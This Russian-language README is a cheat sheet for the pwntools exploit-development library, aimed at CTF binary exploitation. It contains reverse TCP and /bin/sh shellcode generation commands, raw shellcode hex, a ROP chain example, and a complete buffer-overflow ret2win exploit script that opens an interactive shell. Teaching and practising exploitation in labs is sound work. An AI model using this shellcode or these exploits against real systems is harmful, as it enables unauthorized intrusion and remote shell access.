<!-- language-home-navigation -->
[🏠 Русская главная страница](../../README.ru.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇮🇹 Italiano](README.it.md) • [🇵🇹 Português](README.pt.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# Шпаргалка по pwntools

[pwntools](https://github.com/Gallopsled/pwntools) — лучшая в своем классе платформа CTF и библиотека разработки эксплойтов, написанная на Python. Разработанный для быстрого прототипирования, двоичной эксплуатации (pwn) и обратного проектирования, он предоставляет полный набор инструментов командной строки (`pwn cyclic`, `pwn checksec`, `pwn asm`, `pwn shellcraft`) наряду с API-интерфейсом Python высокого уровня для взаимодействия с локальными процессами и удаленными сокетами.

---

## Оглавление

- [Основные возможности](#core-capabilities)
- [Установка](#установка)
- [Утилиты командной строки (`pwn <cmd>`)](#command-line-utilities-pwn-cmd)
  - [`pwn cyclic` (Расчет смещения буфера)](#pwn-cycle-buffer-offset-calculation)
  - [`pwn checksec` (Проверка смягчения последствий)](#pwn-checksec-mitigation-inspection)
  - [`pwn asm` & `pwn disasm` (Ассемблер/Дизассемблер)](#pwn-asm--pwn-disasm-assembler--дизассемблер)
  - [`pwn shellcraft` (Генератор шеллкода)](#pwn-shellcraft-shellcode-generator)
  - [`pwn template` (Генератор скелетов эксплойтов)](#pwn-template-exploit-skeleton-generator)
- [Рабочий процесс разработки эксплойтов Python](#python-exploit-development-workflow)
  - [Подключения процессов и удаленных сокетов](#process--remote-socket-connections)
  - [Разбор и символы ELF](#elf-parsing--symbols)
  - [Строительство ROP-цепи](#rop-chain-construction)
  - [Упаковка и порядок байтов (`p32` / `p64`)](#packing--endianness-p32--p64)
- [Полный пример эксплойта (переполнение буфера + ret2win)](#complete-exploit-example-buffer-overflow--ret2win)

---

## Основные возможности

- **Архитектура Tubes:** унифицированный интерфейс для взаимодействия с локальными процессами (`process`), удаленными TCP-сокетами (`remote`) и сеансами SSH (`ssh`).
- **Двоичная проверка и проверка гаджетов:** Автоматическое разрешение символов ELF, поиск GOT/PLT и автоматический синтез цепочки ROP.
- **Ассемблирование «на лету»:** мгновенный перевод между мнемоникой сборки и кодами операций в x86, x86_64, ARM, MIPS и AArch64.
- **Синтез шелл-кода:** Готовые настраиваемые шаблоны шелл-кода для обратных оболочек, выполнения, чтения файлов и уклонения.

---

## Установка
```bash
# Ubuntu / Debian / Kali Linux
sudo apt-get update && sudo apt-get install -y python3-pwntools

# Via pip in an isolated Python environment
pip3 install pwntools

# Verify command-line utilities
pwn version
```
---

## Утилиты командной строки (`pwn <cmd>`)

### `pwn cyclic` (расчет смещения буфера)
Сгенерируйте уникальные циклические шаблоны Де Брейна для определения точного смещения сбоя (перезапись EIP/RIP):
```bash
# Generate a 200-byte unique pattern
pwn cyclic 200

# Find offset of crashing pattern (e.g. from crash address or register value 0x6161616c)
pwn cyclic -l 0x6161616c
# Output: 44 (offset is exactly 44 bytes to saved instruction pointer)

# 64-bit architecture cyclic pattern lookup
pwn cyclic -l "faaa" -n 8
```
### `pwn checksec` (проверка смягчения последствий)
Проверьте меры безопасности (Canary, NX, PIE, RELRO, ASLR) любого исполняемого файла ELF:
```bash
pwn checksec /path/to/binary
```
### `pwn asm` и `pwn disasm` (Ассемблер/Дизассемблер)
Собираем инструкции в байты шеллкода прямо из терминала:
```bash
# Assemble x86 instructions to hex bytes
pwn asm "xor eax, eax; push eax"

# Assemble 64-bit shellcode with null-byte output format
pwn asm -c amd64 "mov rax, 59; syscall" --format hex

# Disassemble raw hex bytes back to assembly
pwn disasm "31c050682f2f7368682f62696e89e3505389e1b00bcd80" -c i386
```
### `pwn shellcraft` (генератор шелл-кода)
Генерируйте готовые к использованию полезные нагрузки шеллкода непосредственно в стандартный вывод терминала или в двоичные файлы:
```bash
# Generate Linux x64 execve /bin/sh shellcode in hex
pwn shellcraft amd64.linux.sh --format hex

# Generate reverse TCP shellcode (IP: 10.10.14.5, Port: 4444)
pwn shellcraft amd64.linux.connect 10.10.14.5 4444

# Output pure raw bytes directly into a file
pwn shellcraft amd64.linux.sh --format raw > shellcode.bin
```
### `pwn template` (эксплуатация генератора скелетов)
Создайте проверенный в боевых условиях шаблон эксплойта Python для целевого двоичного и удаленного сервера:
```bash
pwn template ./vuln_binary --host 10.10.10.100 --port 1337 > exploit.py
```
---

## Рабочий процесс разработки эксплойтов Python

### Соединения процессов и удаленных сокетов
```python
from pwn import *

# Set target architecture and log level
context.arch = 'amd64'
context.log_level = 'debug'

# Local process execution
io = process('./vuln_binary')

# Or connect to remote CTF instance
# io = remote('10.10.10.100', 1337)

# Send and receive data
io.recvuntil(b'Enter your name: ')
io.sendline(b'Alice')

# Switch to interactive shell once exploit succeeds
io.interactive()
```
### Анализ и символы ELF
Автоматически считывать адреса функций, таблицы GOT и PLT без ручного поиска в GDB:
```python
elf = ELF('./vuln_binary')
print(f"Target function address: {hex(elf.symbols['win'])}")
print(f"puts() PLT address: {hex(elf.plt['puts'])}")
print(f"puts() GOT address: {hex(elf.got['puts'])}")
```
### Строительство цепи ROP
Автоматически создавайте цепочки возвратно-ориентированного программирования (ROP):
```python
elf = ELF('./vuln_binary')
rop = ROP(elf)

# Call win_function(0x1337, 0xdeadbeef)
rop.win(0x1337, 0xdeadbeef)
print(rop.dump())

payload = b"A" * 40 + rop.chain()
```
### Упаковка и порядок байтов (`p32` / `p64`)
Преобразуйте целочисленные адреса памяти в байты с прямым порядком байтов:
```python
# 32-bit little-endian packing
address_32 = p32(0x080484b6)  # Returns b'\xb6\x84\x04\x08'

# 64-bit little-endian packing
address_64 = p64(0x0000000000401156)

# Unpacking bytes to integer
val = u64(b"\x56\x11\x40\x00\x00\x00\x00\x00")
```
---

## Полный пример эксплойта (переполнение буфера + ret2win)
```python
#!/usr/bin/env python3
from pwn import *

# Binary configuration
binary_path = './challenge'
context.binary = binary_path
context.log_level = 'info'

elf = ELF(binary_path)

# 1. Start target process or remote connection
if args.REMOTE:
    io = remote('target.ctf.local', 9999)
else:
    io = process(binary_path)

# 2. Craft payload
offset = 40
win_address = elf.symbols['win']

# Include ret gadget for 16-byte stack alignment in Ubuntu 64-bit
rop = ROP(elf)
ret_gadget = rop.find_gadget(['ret'])[0]

payload = flat(
    asm('nop') * offset,
    ret_gadget,
    win_address
)

# 3. Deliver payload
io.recvuntil(b'Say something: ')
io.sendline(payload)

# 4. Drop to interactive shell
log.success("Exploit sent! Enjoy your shell:")
io.interactive()
```